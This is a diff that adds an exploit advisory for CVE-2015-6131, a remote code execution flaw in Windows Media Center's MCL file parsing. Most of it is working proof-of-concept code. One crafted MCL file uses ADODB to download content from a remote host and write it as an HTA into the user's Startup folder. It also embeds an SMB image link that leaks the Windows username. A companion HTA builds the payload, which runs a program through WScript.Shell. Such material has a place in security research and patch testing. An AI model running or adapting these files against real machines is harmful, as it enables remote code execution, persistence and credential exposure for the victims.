@@ -1,0 +1,72 @@
+Title: Microsoft Windows Media Center Library Parsing RCE Vuln aka "self-executing" MCL file (CVE-2015-6131)
+
+Software Vendor: Microsoft
+
+Software version : MS Windows Media Center latest version on any Windows OS.
+
+Software Vendor Homepage: http://www.microsoft.com
+
+CVE: CVE-2015-6131
+
+Exploit Author: Eduardo Braun Prado
+
+Vulnerability oficial discoverer: Zhang YunHai of NSFOCUS Security Team
+
+date: december 8, 2015
+
+Vulnerability description:
+
+Windows Media Center contains a remote code execution vulnerability because it allows "MCL" files to reference themselves as HTML pages, which will be parsed inside Windows Media Center window, in the context of the local machine security zone of Internet Explorer browser. This in turn allows execution of arbitrary code using eg. ADO ActiveX Objects. AKA "self-executing" MCL files.
+
+
+exploit code below:
+
+----------- self-exec-1.mcl ------------------------------------
+
+<application url="self-exec1.mcl"/><html><script>alert(' I am running in local machine zone which allows arbitrary code execution via, for example, ADO Objects')</script></html>
+
+------------------------------------------------------------
+
+----------self-exec-2.mcl--------------------------------------
+
+<application url="self-exec2.mcl"/><html><b>Use a sniffer software to sniff SMB traffic and retrieve the remote Windows username required for this exploit</b><img src=\\192.168.10.10\smbshare\someimg.jpg></img><script> RecordsetURL='http://192.168.10.10:80/recordsetfile.txt'; var rs = new ActiveXObject('ADODB.recordset'); rs.Open(RecordsetURL); rs.Save('C:/users/windowsuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/poc.hta'); rs.Close();
+</script></html>
+----------------------------------------------------------
+
+-----Create-recordsetfile.hta --------------
+
+<html><body onload="aa()">
+
+<script language="VBScript">
+
+function aa()
+
+
+defdir="."
+
+alert "This script will retrieve data from ""recordsetdata.txt"" and save it to the current directory as ""recordsetfile.txt"". 
+
+
+
+
+Set c = CreateObject("ADODB.Connection")
+co = "Driver={Microsoft Text Driver (*.txt; *.csv)};DefaultDir=" & defdir & ";Extensions=txt;"
+c.Open co
+set rs =CreateObject("ADODB.Recordset")
+rs.Open "SELECT * from recordsetdata.txt", c
+al=rs.Save(defdir & "\recordsetfile.txt")
+rs.close
+
+end function
+</script></body></html>
+
+-------------------------------------------------------------------------------
+
+
+---------recordsetdata.txt------------------------------------------
+
+<html>
+<script>a=new ActiveXObject('Wscript.Shell')</script>
+<script>a.Run('calc.exe',1);</script>
+</html>
+-------------------------------------------------------------------
